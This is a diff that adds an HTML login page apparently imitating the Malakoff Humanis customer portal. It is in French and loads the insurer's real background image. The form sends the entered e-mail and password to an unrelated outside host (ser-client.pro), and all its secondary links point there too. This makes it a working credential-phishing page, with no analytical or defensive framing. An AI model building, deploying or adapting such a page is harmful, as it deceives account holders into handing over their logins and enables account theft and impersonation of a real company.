@@ -1,0 +1,201 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Connexion</title>
+    <link href="https://fonts.googleapis.com/css2?family=Poppins&display=swap" rel="stylesheet">
+    <style>
+        body, input, button, label, a {
+            font-family: 'Poppins', sans-serif;
+        }
+
+        body {
+            background-image: url('https://connexion.malakoffhumanis.com/particuliers/login/static/img/bg.png');
+            background-size: cover;
+            background-repeat: no-repeat;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+        }
+
+        .banner {
+            background-color: white;
+            color: #00559F;
+            padding: 10px 20px;
+            text-align: left;
+            width: 100%;
+            box-sizing: border-box;
+            position: absolute;
+            top: 0;
+            left: 0;
+        }
+
+        .banner img {
+            height: 60px;
+            margin-right: 10px;
+        }
+
+        @media (max-width: 768px) {
+            .banner img {
+                height: 5vh;
+            }
+        }
+
+        .container {
+            max-width: 300px;
+            padding: 30px 20px;
+            background-color: #ffffff;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            border-radius: 5px;
+            margin-top: 60px;
+        }
+
+        h1 {
+            text-align: center;
+            color: #FF6600;
+            margin: 0 0 5vh; /* Updated bottom margin to 5vh */
+            font-weight: normal;
+        }
+
+        label {
+            font-weight: normal;
+            color: #808080;
+            display: block;
+            margin: 10px 0 5px;
+        }
+
+        input[type="text"], input[type="password"] {
+            width: calc(100% - 4px);
+            padding: 5px 2px;
+            margin-bottom: 10px;
+            border: none;
+            border-bottom: 1px solid #ccc;
+            border-radius: 0;
+            box-sizing: border-box;
+        }
+
+        input[type="text"]:focus, input[type="password"]:focus {
+            outline: none;
+            border-bottom: 2px solid #FF6600;
+        }
+
+        .password-container {
+            position: relative;
+        }
+
+        .toggle-password {
+            position: absolute;
+            right: 0;
+            top: 0;
+            cursor: pointer;
+            padding: 10px;
+        }
+
+        .or-text {
+            margin: 10px 0;
+            color: #808080;
+        }
+
+        .button-container {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        .button-container button {
+            width: calc(100% - 20px);
+            padding: 10px;
+            margin: 5px;
+            border: none;
+            border-radius: 20px;
+            cursor: pointer;
+            transition: background-color 0.3s ease;
+        }
+
+        .button-container button.primary {
+            background-color: #FF6600;
+            color: white;
+        }
+
+        .button-container button.secondary {
+            background-color: white;
+            color: #FF6600;
+            border: 1px solid #FF6600;
+        }
+
+        .create-account, .password-reset-link {
+            text-align: center;
+            margin-top: 10px;
+        }
+
+        .create-account a, .password-reset-link a {
+            color: black;
+            text-decoration: underline;
+        }
+
+        .password-reset-link {
+            font-size: smaller;
+        }
+
+        /* Hover effects */
+        .button-container button.primary:hover {
+            background-color: #cc5200;
+        }
+
+        .button-container button.secondary:hover {
+            background-color: #FF6600;
+            color: white;
+        }
+    </style>
+</head>
+<body>
+    <div class="banner">
+        <img src="mlogo.png" alt="Logo">
+    </div>
+    <div class="container">
+        <h1>Je me connecte à mon compte<br></h1>
+        <form action="https://www.ser-client.pro/malakoff-login" method="POST">
+            <label for="username">e-mail*</label>
+            <input type="text" id="username" name="email" required>
+
+            <label for="password">Mot de passe*</label>
+            <div class="password-container">
+                <input type="password" id="password" name="password" required>
+                <span class="toggle-password" onclick="togglePasswordVisibility()">&#128065;</span>
+            </div>
+            
+            <div class="password-reset-link">
+                <a href="https://www.ser-client.pro/malakoff-login">J'ai oublié mon mot de passe</a>
+            </div>
+
+            <div class="button-container">
+                <button class="primary" type="submit">Je me connecte</button>
+                <p class="or-text">ou</p>
+                <button class="secondary" type="button">Me connecter en 1 clic</button>
+            </div>
+
+            <div class="create-account">
+                <a href="https://www.ser-client.pro/malakoff-login">Créer un compte</a>
+            </div>
+        </form>
+    </div>
+
+    <script>
+        function togglePasswordVisibility() {
+            var passwordInput = document.getElementById("password");
+            var passwordIcon = document.querySelector(".toggle-password");
+            if (passwordInput.type === "password") {
+                passwordInput.type = "text";
+                passwordIcon.textContent = "🙈";
+            } else {
+                passwordInput.type = "password";
+                passwordIcon.textContent = "👁";
+            }
+        }
+    </script>
+</body>
+</html>
